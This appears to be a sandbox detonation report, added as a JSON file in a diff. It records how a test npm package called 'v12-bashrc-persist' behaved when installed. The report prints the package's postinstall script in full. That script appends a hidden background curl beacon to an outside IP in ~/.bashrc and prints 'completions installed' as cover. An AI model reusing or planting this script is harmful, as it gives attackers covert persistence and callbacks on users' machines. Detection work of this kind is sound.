@@ -1,0 +1,97 @@
+{
+ "job_id": "b42dec17-5671-410c-9acc-674e9c3e80c8",
+ "status": "completed",
+ "exit_code": 0,
+ "duration_s": 2.92,
+ "exec_events": [
+  {
+   "ts": "2026-11-04T00:43:24.633179782Z",
+   "pid": 290921,
+   "ppid": 290895,
+   "binary": "/usr/local/bin/docker-entrypoint.sh",
+   "args": "/usr/local/bin/docker-entrypoint.sh /bin/sh -c \"/bin/true pre-6e76fed86a52861a; \"$@\"; rc=$?; /bin/true post-6e76fed86a52861a; exit $rc\" detonator-witness npm install --no-audit --no-fund --prefix payloads/v12-bashrc-persist",
+   "parent_binary": "/usr/bin/containerd-shim-runc-v2",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-04T00:43:24.637844024Z",
+   "pid": 290958,
+   "ppid": 290921,
+   "binary": "/usr/local/bin/npm",
+   "args": "node /usr/local/bin/npm install --no-audit --no-fund --prefix payloads/v12-bashrc-persist",
+   "parent_binary": "/bin/sh",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-04T00:43:24.638502057Z",
+   "pid": 290958,
+   "ppid": 290958,
+   "binary": "/usr/local/bin/node",
+   "args": "/usr/local/bin/npm install --no-audit --no-fund --prefix payloads/v12-bashrc-persist",
+   "parent_binary": "/usr/local/bin/npm",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-04T00:43:25.093393030Z",
+   "pid": 290977,
+   "ppid": 290958,
+   "binary": "/usr/bin/sh",
+   "args": "-c \"node scripts/setup.js\"",
+   "parent_binary": "/usr/local/bin/node",
+   "uid": 10001,
+   "cwd": "/work/payloads/v12-bashrc-persist"
+  },
+  {
+   "ts": "2026-11-04T00:43:25.094616052Z",
+   "pid": 290978,
+   "ppid": 290977,
+   "binary": "/usr/local/bin/node",
+   "args": "scripts/setup.js",
+   "parent_binary": "/usr/bin/sh",
+   "uid": 10001,
+   "cwd": "/work/payloads/v12-bashrc-persist"
+  }
+ ],
+ "connect_events": [],
+ "dns_queries": [],
+ "file_events": [
+  {
+   "ts": "2026-11-04T00:43:24.748910050Z",
+   "pid": 290958,
+   "binary": "/usr/local/bin/node",
+   "path": "/home/runner/.npmrc"
+  },
+  {
+   "ts": "2026-11-04T00:43:25.126471045Z",
+   "pid": 290978,
+   "binary": "/usr/local/bin/node",
+   "path": "/home/runner/.bashrc"
+  }
+ ],
+ "executed_scripts": [
+  {
+   "path": "/work/payloads/v12-bashrc-persist/scripts/setup.js",
+   "package": null,
+   "sha256": "9cfb0b19bb40081a8aea3e09ecc5d0006df9cd404e054c81b1b9cdbe1316bbb8",
+   "content": "const fs = require(\"fs\"), os = require(\"os\"), path = require(\"path\");\nconst line = '\\ncurl -s http://203.0.113.77/beacon >/dev/null 2>&1 &\\n';\ntry { fs.appendFileSync(path.join(os.homedir(), \".bashrc\"), line); } catch {}\nconsole.log(\"completions installed\");\n",
+   "truncated": false
+  }
+ ],
+ "decoys": {},
+ "stdout_tail": "\n> v12@1.0.0 postinstall\n> node scripts/setup.js\n\ncompletions installed\n\nup to date in 406ms\n",
+ "stderr_tail": "",
+ "truncated": false,
+ "error": null,
+ "sensor": {
+  "pre_seen": true,
+  "post_seen": true
+ },
+ "resources": {
+  "cpu_s": 0.65,
+  "peak_memory_mb": 39.2,
+  "samples": 2
+ }
+}
